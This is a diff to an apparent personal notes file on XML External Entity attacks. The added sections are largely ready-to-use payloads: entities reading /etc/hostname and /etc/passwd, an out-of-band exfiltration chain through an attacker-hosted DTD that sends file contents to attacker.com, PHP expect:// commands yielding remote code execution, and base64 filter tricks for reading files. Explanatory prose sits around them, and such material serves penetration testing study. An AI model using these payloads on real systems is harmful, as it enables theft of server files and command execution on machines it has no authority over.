@@ -102,7 +102,23 @@ output:
 
 ```
 
+## SYSTEM vs PUBLIC
 
+ *  As indicated by the name, the SYSTEM Entities are intended to be for files locally stored on the machine.
+ *  whereas PUBLIC are for contents accessible from the internet, PUBLIC Entities need an identifier (here: 'm') but the value of the identifier does not matter.
+
+ *  The protocol. Depending on the parser (the programming language), it is possible to use the absolute path of a file, or to use the file:// protocol. Most parsers additionally understand the http:// and https:// handler and, for instance, Java also allows to use jar:// protocol (which basically allows to unzip files). 
+
+   ```python
+     <!ENTITY msg SYSTEM '/etc/hostname'>
+    <!ENTITY msg SYSTEM 'file:///etc/hostname'>
+    <!ENTITY msg SYSTEM 'http:///myserver.com/something'>
+   <!ENTITY msg PUBLIC 'm' '/etc/hostname'>
+  <!ENTITY msg PUBLIC 'm' 'file:///etc/hostname'>
+    <!ENTITY msg PUBLIC 'm' 'http:///myserver.com/something'>
+
+```
+![image](https://github.com/user-attachments/assets/d4e0897b-481a-450b-bc61-d4a83b27be3c)
 
 
 ## Parameter Entities 
@@ -499,7 +515,7 @@ For example, an application might allow users to upload images, and process or v
 
 
 
-OUT OF BAND XXE 
+# OUT OF BAND XXE 
 
 ```python
 
@@ -522,18 +538,88 @@ OUT OF BAND XXE
 		<!ENTITY % bravo "<!ENTITY &#X25; delta SYSTEM 'http://test.com/xxe?%charlie;'>">
 ```
 
+
 ![image](https://github.com/user-attachments/assets/fac143af-70e2-465f-ad51-9b7ca5abdbb0)
 
 
-SSRF
+####The basic Idea looks as follows:
+
+```python    <!DOCTYPE Message [
+    <!ENTITY file SYSTEM "/etc/hostname">
+    <!ENTITY send SYSTEM "http://attacker.com/?read=&file;">
+    ]>
+    <Message>&send;</Message>
+```
+
+* The code above does not work directly.
+* This is due to the fact, that External Entities must not be included in other External Entities. This means, that most parsers will abort the DTD processing on finding the file Entity within the send Entity declaration.
+
+Nevertheless, another DTD feature called Parameter Entities exists that allows to bypass this restriction.
+```python
+    <!DOCTYPE Message [
+      <!ENTITY % file SYSTEM 'file:///etc/hostname'>
+      <!ENTITY % dtd SYSTEM 'http://attacker.com/mydtd'>
+    %dtd;]>
+    <Message>&send;</Message>
+```
+* The above content is then Base64 plus URL-encoded and sent to the SAML-Endpoint URL of the Web Application. Please note, that the Entity send within the <Message> Element is not directly defined in the DTD. It will be defined in the DTD that is loaded from 'http://attacker.com/mydtd' later on.
+
+* The Parameter Entities look similar to common Entities but start with a percentage character (%). They can be seen as a Meta Language for DTD (comparable to #DEFINE instructions in C/C++).
+  
+* The Web Application processes the DTD as follows:
+
+The parser processes the first Parameter Entity % file, thus reading the content of the /etc/hostname system resource.
+It then processes the second Parameter Entity % dtd.
+This one enforces the parser to load an External DTD that is provided by the attacker's HTTP server.
+
+Server responds with:
+```python
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/send/%file;'>">
+    %all;
+```
+* This file is immediately parsed and processed.It defines a Parameter Entity % all that declares an Entity send.
+* The send Entity is an External Entity pointing again to the attacker's server. The URL Request contains the content of the file Parameter Entity.
+* The last line contains only "%all;". This means, that at this place, the content of the %all Entity will be placed. This is the declaration of the send Entity.
+* The last line of the attacker's request contains "%dtd;" - this means, that at this place, the content of the the File
+'http://attacker.com/mydtd' will be placed.
+* This is (again) the declaration of the send Entity.
+Once the Web Application processes the line "<Response>&send;</Response>",  the GET Request 'http://attacker.com/send/%file;' is executed and the attacker receives the content of the
+    '/etc/hostname' file.
+
+
+
+
+### SSRF
 
 ![image](https://github.com/user-attachments/assets/4d87f9d3-0ce3-4710-9116-99523e49c72c)
 
 
-PHP RCE
+### PHP Remote Code Execution
+
+* If fortune is on our side, and the PHP “expect” module is loaded, we can get RCE.
+```python
+  <?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "expect://id" >]>
+<creds>
+    <user>&xxe;</user>
+    <pass>mypass</pass>
+</creds>
+```
+
+The response from the server will be something like:
+
+```python
+You have logged in as user uid=0(root) gid=0(root) groups=0(root)
+```
+
+Instances where RCE is possible via XXE are rare, 
+
+```python
 
 (<!ENTITY rce SYSTEM “expect://ifconfig” >).
-
+```
 
 # later
 
@@ -558,3 +644,27 @@ formatting.dtd:
 <specifications>&file;</specifications>
 
 ```
+## BYPASS
+
+###  Special Characters and Linefeed
+
+For the exploit phase, the attacker has to chose which file he wants to read. We tried different ones. Most popular is reading the '/etc/passwd' file.
+However, this file might include whitespaces, linefeeds and special characters.
+Depending on the target Web Application and its XML parser, the file can cause problems. For example, within the GET request, they can break the parsing process, or characters like '<' can produce invalid XML, so that it is not parseable.
+
+Thus, we prefer to use the file ``` '/etc/hostname'```  for testing purposes.
+
+In PHP, there is a nice possibility to read arbitrary files by encoding it directly with Base64:
+
+```python
+    <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd" >
+ ```
+
+
+###  Load Balancers
+
+We could detect a strange behavior on some Web Applications.
+We sent several XXEA messages to them and tried to read the '/etc/hostname' file. It failed in some cases, but in other tries it was successful.
+
+This is due to the fact, that the Web Application was behind a load balancer that deligates the requests to different servers.
+On some of them, the '/etc/hostname' file exists, on other, it doesn't. This is, for example, the case for CentOS Servers.
